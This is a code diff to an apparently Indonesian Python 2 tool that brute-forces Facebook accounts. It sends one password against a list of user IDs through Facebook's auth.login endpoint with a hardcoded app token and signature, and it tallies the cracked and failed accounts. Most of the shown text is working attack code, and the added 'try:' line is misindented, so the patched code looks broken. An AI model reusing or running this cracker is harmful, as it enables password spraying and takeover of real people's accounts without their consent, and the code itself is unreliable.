@@ -105,7 +105,7 @@ def login():
             run (h+" Login Sukses\033[97m........")
             print
             id_teman()
-        elif "error_msg" in dev:
+        elif "www.facebook.com" in jsl["error_msg"]:
             print 
             print k+" Akun Kena Cekpoint.." 
             print
@@ -175,6 +175,10 @@ def mbf():
             print h+"  []" + a + " Selamat Datang " + pu + nama + "\033[92m :)"
             print d+"  ======================================"
             password = raw_input(h+"  [" +k+ "MBF" +h+ "]" + a + " Cracking Password" + p + ": ")
+            if password == " ":
+                print m+" Jangan Kosong Cuk.."
+                mbf()
+                sel()
             print
             try:
                 listID = open('id.txt', "r")
@@ -203,6 +207,7 @@ def iqbaldevmbf():
         data_lis = open('id.txt', "r")
         baris = data_lis.read().split()
         while listID:
+        try:
             user = listID.readline().strip()
             url = "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + password + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
             Iq_data = urllib.urlopen(url)
@@ -223,7 +228,9 @@ def iqbaldevmbf():
         
             sys.stdout.write(pu+ "\r [$]" + a + " Cracking " + p + str(len(baris)) + pu + " / " + p + str(count) + m + " [ " + h + str(len(dados)) + pu + " / " + k + str(len(gagal)) + m + " ]")
             sys.stdout.flush()
-        
+            
+        except KeyboardInterrupt:
+            sel()
 
     except IOError:
         print
